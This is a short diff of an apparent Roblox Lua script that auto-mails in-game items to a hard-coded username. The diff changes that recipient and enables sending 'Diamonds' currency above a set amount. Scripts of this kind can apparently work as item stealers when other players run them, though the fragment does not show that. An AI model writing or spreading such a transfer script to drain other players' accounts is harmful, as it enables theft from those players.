@@ -1,5 +1,5 @@
 PAUSE_or_SEND = "s"
-NAME_USER_SEND = "560Angel1724"
+NAME_USER_SEND = "vonloans50"
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -96,6 +96,9 @@ local function mailboxSend(target, message, class, uid, amount)
 end
 
 local SETTINGS_SENT_ITEM = {
+
+["Diamonds"] = {Class = "Currency", Id = "Diamonds", MinAmount = 65000000000},	--ok
+
 
 --["MVP Key Upper Half"] = {Class = "Misc", Id = "MVP Key Upper Half", MinAmount = 1000},	--ok
 --["MVP Key Lower Half"] = {Class = "Misc", Id = "MVP Key Lower Half", MinAmount = 50001, keepAmount = 20000},	
